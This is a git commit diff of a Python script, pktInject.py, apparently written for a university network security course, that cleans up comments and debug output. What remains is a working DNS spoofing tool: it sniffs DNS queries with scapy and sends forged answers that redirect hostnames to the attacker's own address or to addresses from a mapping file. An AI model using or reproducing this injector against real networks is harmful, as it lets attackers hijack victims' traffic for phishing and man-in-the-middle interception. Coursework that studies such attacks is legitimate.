c457cc2f56c3f0ad03746158ca8c35fea85c011c
SelinaDeepKaur <sekaur@cs.stonybrook.edu>
2017-12-08 19:42:58 -0800

    Final Inject code

--- pktInject.py
+++ pktInject.py
@@ -1,42 +1,21 @@
-#https://pymotw.com/2/optparse/
-#https://stackoverflow.com/questions/11735821/python-get-localhost-ip (hotname to ip)
 #!/usr/bin/python
-
-
-#pypcap library for default interfac?? piazaa (https://piazza.com/class/j6lyorzz9qj5i3?cid=175)
-#expression wala check, expression in ip or ip in expression
-
-
-
 from optparse import OptionParser
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 import netifaces as ni
 import os
 import socket
 import pcap
 from scapy.all import *
 
-
 def get_ip(ifname):
     	ni.ifaddresses(ifname)
 	ip = ni.ifaddresses(ifname)[ni.AF_INET][0]['addr']
-	return ip  # should print "192.168.100.37"
-
-#def injector(packet):
-#    if packet.haslayer(TCP):
-#        print pkt.summary()
-#        print pkt.show()
-#        print pkt[TCP]
+	return ip 
 
 def injector(pkt):
-	#pkt.show()
 	redirect_to=""
-	#print '--------------------------------has IP----------------------------------------'
 	if pkt.haslayer(IP) and pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
-		pkt.show()
-		#print '--------------------------------has IP----------------------------------------'
-	#if((pkt[IP].src in expression) or (expression == "")): 
-		#if pkt.haslayer(DNSQR): # DNS question record
-		#print 'has DNSQR'
 		affectedHost = pkt[DNSQR].qname
 		if options.hostsmap!=None:
 			if affectedHost.rstrip('.') in mapping:	
@@ -48,7 +27,6 @@ def injector(pkt):
 					
 		else:
 			redirect_to = get_ip(options.interface)
-		#print 'starting spoofing'
 		if pkt.haslayer(UDP):
 			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
 				      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
@@ -61,12 +39,9 @@ def injector(pkt):
 				      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
 		else:
 			return
-		#print 'spoofed'
 		send(spoofed_pkt)
-		#print 'Sent:', spoofed_pkt.summary()
 
 if __name__ == '__main__':
-	#expression = ""
 	mapping = {}
 	parser = OptionParser()
 	parser.set_conflict_handler("resolve")
@@ -75,16 +50,10 @@ if __name__ == '__main__':
 
 	(options, remainder) = parser.parse_args()
 	expression = remainder
-	#print options.interface
-	#print options.hostsmap
-	#print expression
-	
 	if len(expression)>0:
 		exp = expression[0]
 	else:
 		exp = ""
-	#get_ip('ens33')
-	print exp
 
 	if options.hostsmap==None:
 		redirect_to = get_ip(options.interface)
@@ -93,11 +62,8 @@ if __name__ == '__main__':
 		file=open(options.hostsmap,"r")
 		for line in file:
 			row = line.split()
-			print row
                     	mapping[row[1]]=row[0]
-		print mapping
-			#if affectedHost.rstrip('.') in line:	
-            		#	row = line.split(" ")
+
 	sniff(filter=exp, prn=injector, store=0, iface=options.interface)
 
 
